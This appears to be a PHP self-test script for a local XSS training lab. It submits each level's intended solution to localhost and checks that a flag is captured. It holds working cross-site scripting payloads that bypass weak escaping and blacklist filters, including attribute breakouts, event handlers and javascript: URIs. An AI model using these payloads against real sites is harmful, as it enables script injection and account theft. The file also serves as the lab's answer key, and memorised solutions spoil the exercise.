<?php
/**
 * XSS Lab self-test: runs the intended solution for every level against the
 * live app, so a level that has quietly stopped being solvable is caught.
 * Run inside the container:
 *
 *   docker compose exec web php /var/www/html/solve_check.php
 *
 * Not part of the challenge - it exists so the lab can be regression-tested.
 */
require_once __DIR__ . '/helpers.php';

$base = 'http://localhost';
$pass = 0;
$fail = 0;

function get(string $path, array $params): string
{
    $ctx = stream_context_create(['http' => [
        'method'  => 'GET',
        'timeout' => 20,
        'ignore_errors' => true,
    ]]);
    return (string)@file_get_contents($path . '?' . http_build_query($params), false, $ctx);
}

function post(string $url, array $fields): string
{
    $ctx = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($fields),
        'timeout' => 20,
        'ignore_errors' => true,
    ]]);
    return (string)@file_get_contents($url, false, $ctx);
}

/**
 * A level counts as solved only when the page rendered its "Flag Captured!"
 * box - the payload is echoed back on these pages, so matching the flag string
 * anywhere in the body would not prove anything.
 */
function check(int $level, string $body, string $note = ''): void
{
    global $pass, $fail;
    $want  = get_flag_for_level($level);
    $shown = preg_match('~class="flag-display"[\s\S]{0,400}?<code>([^<]*)</code>~', $body, $m)
        ? trim($m[1]) : '';
    if ($want !== '' && $shown === $want) {
        $pass++;
        printf("  PASS  level %-2d %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    } else {
        $fail++;
        printf("  FAIL  level %-2d expected %s, page showed %s%s\n",
            $level, $want, $shown === '' ? '(no flag box)' : $shown,
            $note !== '' ? "  ($note)" : '');
    }
}

echo "XSS Lab self-test\n-----------------\n";

/* 1 - raw concatenation into HTML text context */
check(1, get("$base/level1.php", ['name' => '<script>alert(1)</script>']),
    'script tag straight into the DOM');

/* 2 - ENT_NOQUOTES leaves " alone, so the value attribute can be closed */
check(2, get("$base/level2.php", ['q' => '" onmouseover="alert(1)']),
    'break out of value="..."');

/* 3 - stored: the comment is persisted and re-rendered raw */
check(3, post("$base/level3.php", ['author' => 'tester', 'comment' => '<img src=x onerror=alert(1)>']),
    'payload persisted to stored_comments.json');

/* 4 - innerHTML does not run <script>, so an event handler is required */
check(4, get("$base/level4.php", ['msg' => '<img src=x onerror=alert(1)>']),
    'innerHTML sink');

/* 5 - ENT_COMPAT leaves the single quote alone */
check(5, get("$base/level5.php", ['bio' => "' onfocus='alert(1)' autofocus='"]),
    "break out of value='...'");

/* 6 - str_replace is case sensitive and runs only once */
check(6, get("$base/level6.php", ['input' => '<SCRIPT>alert(1)</SCRIPT>']),
    'case flip beats str_replace');

/* 7 - href takes any scheme */
check(7, get("$base/level7.php", ['url' => 'javascript:alert(1)']),
    'javascript: URI');

/* 8 - JSON encoding is not HTML encoding */
check(8, get("$base/level8.php", ['message' => '<img src=x onerror=alert(1)>']),
    'JSON string into innerHTML');

/* 9 - the blacklist names four strings; onerror= is not one of them */
check(9, get("$base/level9.php", ['xss' => '<img src=x onerror=alert(1)>']),
    'unlisted event handler');

/* 10 - none of the three layers touch <details ontoggle> */
check(10, get("$base/level10.php", ['payload' => '<details ontoggle=alert(1) open>']),
    'ontoggle survives all three layers');

/* Alternative solutions worth keeping honest - reported, not scored. */
$alts = [
    [6,  ['input' => '<scr<script>ipt>alert(1)</scr</script>ipt>'], 'level6.php',  'input',   'nested tag reassembly'],
    [9,  ['xss' => '<details open ontoggle=alert(1)>'],             'level9.php',  'xss',     'ontoggle'],
    [10, ['payload' => '<svg onpointerenter=alert(1)>hover</svg>'], 'level10.php', 'payload', 'onpointerenter'],
];
foreach ($alts as [$lvl, $params, $page, $_p, $label]) {
    $b = get("$base/$page", $params);
    $ok = preg_match('~class="flag-display"[\s\S]{0,400}?<code>([^<]*)</code>~', $b, $m)
        && trim($m[1]) === get_flag_for_level($lvl);
    echo $ok
        ? "  note  level $lvl alternative works ($label)\n"
        : "  WARN  level $lvl alternative failed ($label)\n";
}

echo "-----------------\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
